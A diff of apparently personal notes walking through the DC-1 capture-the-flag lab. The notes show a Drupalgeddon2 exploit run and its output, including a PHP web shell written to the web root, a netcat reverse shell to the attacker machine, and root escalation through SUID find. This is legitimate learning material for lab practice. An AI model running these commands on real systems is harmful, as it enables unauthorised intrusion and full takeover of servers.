@@ -110,54 +110,234 @@ Content-Type: text/html; charset=utf-8
 ```
 
 ```bash
-searchsploit Drupal 7
--------------------------------------------------------------- ---------------------------------
- Exploit Title                                                |  Path
--------------------------------------------------------------- ---------------------------------
-Drupal 10.1.2 - web-cache-poisoning-External-service-interact | php/webapps/51723.txt
-Drupal 4.1/4.2 - Cross-Site Scripting                         | php/webapps/22940.txt
-Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                 | php/webapps/1088.pl
-Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution   | php/webapps/1821.php
-Drupal 4.x - URL-Encoded Input HTML Injection                 | php/webapps/27020.txt
-Drupal 5.2 - PHP Zend Hash ation Vector                       | php/webapps/4510.txt
-Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulner | php/webapps/11060.txt
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin U | php/webapps/34992.py
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Sessi | php/webapps/44355.php
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset | php/webapps/34984.py
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset | php/webapps/34993.php
-Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code | php/webapps/35150.php
-Drupal 7.12 - Multiple Vulnerabilities                        | php/webapps/18564.txt
-Drupal 7.x Module Services - Remote Code Execution            | php/webapps/41564.php
-Drupal < 4.7.6 - Post Comments Remote Command Execution       | php/webapps/3313.pl
-Drupal < 5.1 - Post Comments Remote Command Execution         | php/webapps/3312.pl
-Drupal < 5.22/6.16 - Multiple Vulnerabilities                 | php/webapps/33706.txt
-Drupal < 7.34 - Denial of Service                             | php/dos/35415.txt
-Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code ( | php/webapps/44557.rb
-Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code ( | php/webapps/44557.rb
-Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code E | php/webapps/44542.txt
-Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' | php/webapps/44449.rb
-Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote C | php/remote/44482.rb
-Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote C | php/remote/44482.rb
-Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote C | php/webapps/44448.py
-Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize | php/remote/46510.rb
-Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize | php/remote/46510.rb
-Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Executio | php/webapps/46452.txt
-Drupal < 8.6.9 - REST Module Remote Code Execution            | php/webapps/46459.py
-Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclo | php/webapps/44501.txt
-Drupal avatar_uploader v7.x-1.0-beta8 - Cross Site Scripting  | php/webapps/50841.txt
-Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persis | php/webapps/25493.txt
-Drupal Module CODER 2.5 - Remote Command Execution (Metasploi | php/webapps/40149.rb
-Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution | php/remote/40144.php
-Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site | php/webapps/35397.txt
-Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbi | php/webapps/37453.php
-Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/ | php/webapps/35072.txt
-Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metaspl | php/remote/40130.rb
-Drupal Module Sections - Cross-Site Scripting                 | php/webapps/10485.txt
-Drupal Module Sections 5.x-1.2/6.x-1.2 - HTML Injection       | php/webapps/33410.txt
--------------------------------------------------------------- ---------------------------------
+searchsploit drupal 7 remote
+---------------------------------------------------------------------------------
+ Exploit Title                                                                                                                                                  |  Path
+---------------------------------------------------------------------------------
+Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                                                                     | php/webapps/1821.php
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                                        | php/webapps/35150.php
+Drupal 7.x Module Services - Remote Code Execution                                                                                                              | php/webapps/41564.php
+Drupal < 4.7.6 - Post Comments Remote Command Execution                                                                                                         | php/webapps/3313.pl
+Drupal < 5.1 - Post Comments Remote Command Execution                                                                                                           | php/webapps/3312.pl
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                        | php/webapps/44557.rb
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                        | php/webapps/44557.rb
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                     | php/webapps/44542.txt
+Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                             | php/webapps/44449.rb
+Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                         | php/remote/44482.rb
+Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                         | php/remote/44482.rb
+Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                                | php/webapps/44448.py
+Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                           | php/remote/46510.rb
+Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                           | php/remote/46510.rb
+Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                                  | php/webapps/46452.txt
+Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                              | php/webapps/46459.py
+Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                                                                                                 | php/webapps/40149.rb
+Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                                   | php/remote/40144.php
+Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                               | php/remote/40130.rb
+---------------------------------------------------------------------------------
 Shellcodes: No Results
+
 
 ```
 
+
 Drupalgeddon SQL Injection : 
 	`?q=` query parameter was historically used to pass the internal system path to the main `index.php` file, which then processed the request. For example, a request for the page "about-us" would internally be processed as `index.php?q=about-us`.This parameter is a technical detail of how Drupal 7 and earlier versions handled URL routing, especially when "Clean URLs" were not enabled.
+
+CVE : Common Vulnerabilities and Exposures
+
+```bash
+searchsploit -x 44449
+
+  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/44449
+     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
+    Codes: CVE-2018-7600
+ Verified: True
+File Type: Ruby script, ASCII text
+
+```
+
+```bash
+ searchsploit -m 44449
+
+  Exploit: Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/44449
+     Path: /usr/share/exploitdb/exploits/php/webapps/44449.rb
+    Codes: CVE-2018-7600
+ Verified: True
+File Type: Ruby script, ASCII text
+Copied to: /home/kali/CyberSec/44449.rb
+
+```
+
+```bash
+sudo gem install highline
+```
+
+```bash
+ruby "44449.rb" http://192.168.56.104
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[i] Target : http://192.168.56.104/
+--------------------------------------------------------------------------------
+[!] MISSING: http://192.168.56.104/CHANGELOG.txt    (HTTP Response: 404)
+[!] MISSING: http://192.168.56.104/core/CHANGELOG.txt    (HTTP Response: 404)
+[+] Found  : http://192.168.56.104/includes/bootstrap.inc    (HTTP Response: 403)
+[!] MISSING: http://192.168.56.104/core/includes/bootstrap.inc    (HTTP Response: 404)
+[+] Found  : http://192.168.56.104/includes/database.inc    (HTTP Response: 403)
+[+] URL    : v7.x/6.x?
+[+] Found  : http://192.168.56.104/    (HTTP Response: 200)
+[+] Metatag: v7.x/6.x [Generator]
+[!] MISSING: http://192.168.56.104/    (HTTP Response: 200)
+[+] Drupal?: v7.x/6.x
+--------------------------------------------------------------------------------
+[*] Testing: Form   (user/password)
+[+] Result : Form valid
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Clean URLs
+[+] Result : Clean URLs enabled
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution   (Method: name)
+[i] Payload: echo KMSSYELD
+[+] Result : KMSSYELD
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+--------------------------------------------------------------------------------
+[*] Testing: Existing file   (http://192.168.56.104/shell.php)
+[i] Response: HTTP 404 // Size: 13
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Writing To Web Root   (./)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
+[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+--------------------------------------------------------------------------------
+[i] Fake PHP shell:   curl 'http://192.168.56.104/shell.php' -d 'c=hostname'
+DC-1>>
+```
+
+```bash
+❯ nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+-v : reverse -n : don't do DNS Resolution
+
+```bash
+DC-1>>nc 192.168.56.103 4444 -e /bin/bash
+```
+
+-e : After the connection, execute a program and bind the input/output of this program to the TCP connection.
+
+```bash
+connect to [192.168.56.103] from (UNKNOWN) [192.168.56.104] 33460
+
+script -qc /bin/bash /dev/null
+www-data@DC-1:/var/www$
+```
+
+so now we get a stable reverse shell.
+
+```bash
+www-data@DC-1:/var/www$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+```bash
+www-data@DC-1:/var/www$ cat /etc/passwd | grep -v 'false\|nologin'
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
+```
+
+`/etc/passwd` format :
+
+`username:password:UID:GID:comment:home:shell`
+
+UID > = 1000 are users generally.
+
+nobody is a Linux default low privilege account, which designed to execute programs.
+
+```
+d | rwx | rwx | rwx
+    ↑     ↑     ↑
+   owner group others
+   
+r = 4
+w = 2
+x = 1
+```
+
+```bash
+www-data@DC-1:/var/www$ cd /home/flag4
+```
+
+```bash
+www-data@DC-1:/home/flag4$ cat flag4.txt
+Can you use this same method to find or access the flag in root?
+
+Probably. But perhaps it's not that easy.  Or maybe it is?
+```
+
+```bash
+find / -perm -u+s -type f 2>/dev/null
+```
+
+Finding all programs will execute with root privilege.
+`-type f` : find normal files only
+`-perm` : finding file according to privilege
+`u` = Users `s` = SUID bit
+
+```bash
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+/bin/umount
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/bin/find
+/usr/sbin/exim4
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/sbin/mount.nfs
+```
+
+```bash
+/usr/bin/find . -exec /bin/bash -p \; -quit
+```
+
+```bash
+bash-4.2# cd /root
+bash-4.2# ls
+thefinalflag.txt
+bash-4.2# cat thefinalflag.txt
+Well done!!!!
+
+Hopefully you've enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+```
